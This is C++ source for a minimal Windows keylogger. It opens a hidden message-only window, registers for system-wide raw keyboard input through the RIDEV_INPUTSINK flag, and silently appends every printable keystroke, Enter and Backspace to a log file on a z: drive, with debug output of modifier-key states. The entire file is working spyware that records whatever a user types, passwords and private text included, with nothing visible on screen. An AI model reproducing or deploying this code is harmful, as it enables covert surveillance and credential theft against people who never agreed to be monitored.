// Minimal Key Logger using RAWINPUT

#include <windows.h>
#include <strsafe.h>
#include <time.h>
#include "output_debug.h"

// prototype
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);

HWND hWnd;
UINT dwSize;
DWORD fWritten;
WCHAR keyChar;
WCHAR szOutput[128];
HANDLE hFile;
LPCWSTR fName=L"z:/kl.log";
RAWINPUTDEVICE rid;

#define SIZE 52

// Main
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
    MSG msg          = {0};
    WNDCLASS wc      = {0};

    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInstance;
    wc.lpszClassName = L"kl";

    RegisterClass(&wc);
    hWnd = CreateWindow(wc.lpszClassName,NULL,0,0,0,0,0,HWND_MESSAGE,NULL,hInstance,NULL);
    BOOL bRet;
    while((bRet=GetMessage(&msg,hWnd,0,0))!=0)
    {
        if(bRet==-1)
        {
            return bRet;
        }
        else
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    return msg.wParam;
}

// WndProc is called when a window message is sent to the handle of the window
LRESULT CALLBACK WndProc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam)
{
    switch(message)
    {
    case WM_CREATE:
    {
        // create log file for writing
        hFile=CreateFile(fName,GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
        if(hFile==INVALID_HANDLE_VALUE)
        {
            break;
        }
        // write date time to log file
        time_t ltime;
        wchar_t buf[SIZE];
        time(&ltime);
        _wctime_s(buf,SIZE,&ltime);

        SetFilePointer(hFile,0,NULL,FILE_END);
        WriteFile(hFile,"\r\n",2,&fWritten,0);
        SetFilePointer(hFile,0,NULL,FILE_END);
        WriteFile(hFile,buf,SIZE,&fWritten,0);
        SetFilePointer(hFile,0,NULL,FILE_END);
        WriteFile(hFile,"\r\n",2,&fWritten,0);
        CloseHandle(hFile);

        // register interest in raw data
        rid.dwFlags=RIDEV_NOLEGACY|RIDEV_INPUTSINK;	// ignore legacy messages and receive system wide keystrokes
        rid.usUsagePage=1;							// raw keyboard data only
        rid.usUsage=6;
        rid.hwndTarget=hWnd;
        RegisterRawInputDevices(&rid,1,sizeof(rid));
        break;
    }
    case WM_INPUT:
    {
        SHORT shiftstate,ctrlstate,menustate,lwinstate,rwinstate;
        SHORT ashiftstate,actrlstate,amenustate;
        if(GetRawInputData((HRAWINPUT)lParam,RID_INPUT,NULL,&dwSize,sizeof(RAWINPUTHEADER))==-1)
        {
            break;
        }
        LPBYTE lpb=new BYTE[dwSize];
        if(lpb==NULL)
        {
            break;
        }
        shiftstate = ::GetKeyState(VK_SHIFT);
        ctrlstate = ::GetKeyState(VK_CONTROL);
        menustate = ::GetKeyState(VK_MENU);
        lwinstate = ::GetKeyState(VK_LWIN);
        rwinstate = ::GetKeyState(VK_RWIN);
        ashiftstate = ::GetAsyncKeyState(VK_SHIFT);
        actrlstate = ::GetAsyncKeyState(VK_CONTROL);
        amenustate = ::GetAsyncKeyState(VK_MENU);


        DEBUG_INFO("BeforeGet shiftstate 0x%04x ctrlstate 0x%04x menustate 0x%04x lwinstate 0x%04x rwinstate 0x%04x\n",
                   shiftstate,ctrlstate,menustate,lwinstate,rwinstate);
        DEBUG_INFO("BeforeGet ashiftstate 0x%04x actrlstate 0x%04x amenustate 0x%04x\n",
                   ashiftstate,actrlstate,amenustate);
        if(GetRawInputData((HRAWINPUT)lParam,RID_INPUT,lpb,&dwSize,sizeof(RAWINPUTHEADER))!=dwSize)
        {
            delete[] lpb;
            break;
        }
        PRAWINPUT raw=(PRAWINPUT)lpb;
        UINT Event;

        DEBUG_INFO(" Kbd: make=%04x Flags:%04x Reserved:%04x ExtraInformation:%08x, msg=%04x VK=%04x \n",
                   raw->data.keyboard.MakeCode,
                   raw->data.keyboard.Flags,
                   raw->data.keyboard.Reserved,
                   raw->data.keyboard.ExtraInformation,
                   raw->data.keyboard.Message,
                   raw->data.keyboard.VKey);

        shiftstate = ::GetKeyState(VK_SHIFT);
        ctrlstate = ::GetKeyState(VK_CONTROL);
        menustate = ::GetKeyState(VK_MENU);
        lwinstate = ::GetKeyState(VK_LWIN);
        rwinstate = ::GetKeyState(VK_RWIN);
        ashiftstate = ::GetAsyncKeyState(VK_SHIFT);
        actrlstate = ::GetAsyncKeyState(VK_CONTROL);
        amenustate = ::GetAsyncKeyState(VK_MENU);


        DEBUG_INFO("AfterGet shiftstate 0x%04x ctrlstate 0x%04x menustate 0x%04x lwinstate 0x%04x rwinstate 0x%04x\n",
                   shiftstate,ctrlstate,menustate,lwinstate,rwinstate);
        DEBUG_INFO("AfterGet ashiftstate 0x%04x actrlstate 0x%04x amenustate 0x%04x\n",
                   ashiftstate,actrlstate,amenustate);
        Event=raw->data.keyboard.Message;
        keyChar=MapVirtualKey(raw->data.keyboard.VKey,MAPVK_VK_TO_CHAR);
        delete[] lpb;			// free this now

        // read key once on keydown event only
        if(Event==WM_KEYDOWN)
        {
            if(keyChar<32) 		// anything below spacebar other than backspace, tab or enter we skip
            {
                if((keyChar!=8)&&(keyChar!=9)&&(keyChar!=13))
                {
                    break;
                }
            }
            if(keyChar>126) 	// anything above ~ we skip
            {
                break;
            }
            // open log file for writing
            hFile=CreateFile(fName,GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
            if(hFile==INVALID_HANDLE_VALUE)
            {
                break;
            }
            if(keyChar==8) 								// handle backspaces
            {
                SetFilePointer(hFile,-1,NULL,FILE_END);
                keyChar=0;
                WriteFile(hFile,&keyChar,1,&fWritten,0);
                CloseHandle(hFile);
                break;
            }
            SetFilePointer(hFile,0,NULL,FILE_END);
            if(keyChar==13) 							// handle enter key
            {
                WriteFile(hFile,"\r\n",2,&fWritten,0);
                CloseHandle(hFile);
                break;
            }
            WriteFile(hFile,&keyChar,1,&fWritten,0);	// handle all else
            CloseHandle(hFile);
        }
        break;
    }
    case WM_CLOSE:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd,message,wParam,lParam);
    }
    return 0;
}
